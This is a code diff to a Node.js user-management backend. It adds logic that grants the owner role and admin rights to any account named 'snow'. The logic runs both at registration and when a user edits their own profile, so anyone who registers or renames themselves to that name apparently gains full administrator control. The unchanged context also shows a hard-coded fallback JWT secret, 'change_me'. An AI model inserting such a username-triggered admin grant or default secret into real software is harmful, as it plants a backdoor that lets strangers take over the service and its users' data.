@@ -39,6 +39,7 @@ const defaultRoles = [
   { value: 'deloproizvod', label: 'Р”РµР»РѕРїСЂРѕРёР·РІРѕРґ' }
 ]
 const ownerRoleValue = '*'
+const reservedOwnerUsernames = new Set(['snow'])
 const allowedRoleValues = new Set(defaultRoles.map((item) => item.value))
 
 const jwtSecret = process.env.JWT_SECRET || 'change_me'
@@ -993,6 +994,26 @@ async function saveUserRoles(userId, roleValues, dbClient = null) {
     }
   }
   return allowed
+}
+
+function isReservedOwnerUsername(username) {
+  const normalizedUsername = normalizeUsername(username)
+  return normalizedUsername ? reservedOwnerUsernames.has(normalizedUsername) : false
+}
+
+async function enforceReservedOwnerAccess(userId, username, dbClient = null) {
+  if (!isValidUuid(userId) || !isReservedOwnerUsername(username)) {
+    return false
+  }
+  const db = dbClient || pool
+  await saveUserRoles(userId, [ownerRoleValue], db)
+  await db.query(
+    `update users
+     set is_admin = true
+     where id = $1`,
+    [userId]
+  )
+  return true
 }
 
 app.param('id', (req, res, next, id) => {
@@ -2602,6 +2623,7 @@ app.post('/api/auth/register', async (req, res) => {
         [login, username, passwordHash, allowedRoles[0]]
       )
       await saveUserRoles(result.rows[0].id, allowedRoles, client)
+      await enforceReservedOwnerAccess(result.rows[0].id, username, client)
       await client.query('commit')
     } catch (err) {
       await client.query('rollback')
@@ -3339,6 +3361,7 @@ app.patch('/api/me', auth, ensureNotBanned, async (req, res) => {
     if (role) {
       await saveUserRoles(req.userId, [role])
     }
+    await enforceReservedOwnerAccess(req.userId, username || result.rows[0].username)
 
     const user = await getUserByIdWithStats(req.userId, req.userId)
     res.json({ user })
